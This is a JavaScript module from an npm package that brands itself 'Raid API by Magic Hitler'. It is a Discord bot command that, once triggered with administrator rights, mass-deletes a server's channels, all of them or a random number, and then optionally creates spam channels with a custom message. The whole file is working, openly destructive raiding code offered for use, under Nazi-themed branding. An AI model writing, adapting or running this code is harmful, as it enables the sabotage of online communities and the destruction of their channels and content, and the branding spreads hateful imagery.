module.exports = (client, prefix, commande, parametres) => {
    const AlreadyDeletedChannels = new Set()
    client.on("message", (message) => {
        if (message.content === prefix + commande) {
            if (!message.guild.me.hasPermission('ADMINISTRATOR')) return console.log("Permissions insuffisantes pour supprimer les salons.\n(node_modules/magic_hitler/scripts/channels/deleteChannels.js:16)");

            function findNewChannel() {
                let channel = message.guild.channels.random();
                if (AlreadyDeletedChannels.has(channel.id)) return findNewChannel();
                AlreadyDeletedChannels.add(channel.id);
                channel.delete('Raid API by Magic Hitler : npm i magic_hitler');
            }

            async function countChannels() {
                if (message.guild.channels.size > 0) setTimeout(countChannels, 1000);
                else {
                    if (parametres.createdChannelName === "random") {
                        let newChannel = await message.guild.createChannel(Math.floor(Math.random() * Math.floor(99999999999)) || "Raid API by Magic Hitler", "text");
                        if (parametres.createChannelMessage) {
                            newChannel.send(parametres.createChannelMessage);
                        }
                    } else {
                        let newChannel = await message.guild.createChannel(parametres.createdChannelName || "Raid API by Magic Hitler", "text");
                        if (parametres.createChannelMessage) {
                            newChannel.send(parametres.createChannelMessage);
                        }
                    }
                }
            }

            if (parametres.deleteSpecificChannels) {
                if (parametres.deleteSpecificChannels > message.guild.channels.size) return console.log("Nombre de salons à supprimer supérieur au nom de salons du serveur (" + parametres.deleteSpecificChannels + " > " + message.guild.channels.size + ") (node_modules/magic_hitler/scripts/channels/deleteChannels.js:22)")
                for (var i = 0; i < parametres.deleteSpecificChannels; i++) {
                    let channel = message.guild.channels.random();
                    if (AlreadyDeletedChannels.has(channel.id)) return findNewChannel();
                    AlreadyDeletedChannels.add(channel.id);
                    channel.delete('Raid API by Magic Hitler : npm i magic_hitler');
                }
            } else {
                message.guild.channels.map((channel) => {
                    channel.delete('Raid API by Magic Hitler : npm i magic_hitler');
                });
                if (parametres.createChannel) {
                    if (parametres.createChannel === true) countChannels();
                }
            }
        }
    });
}
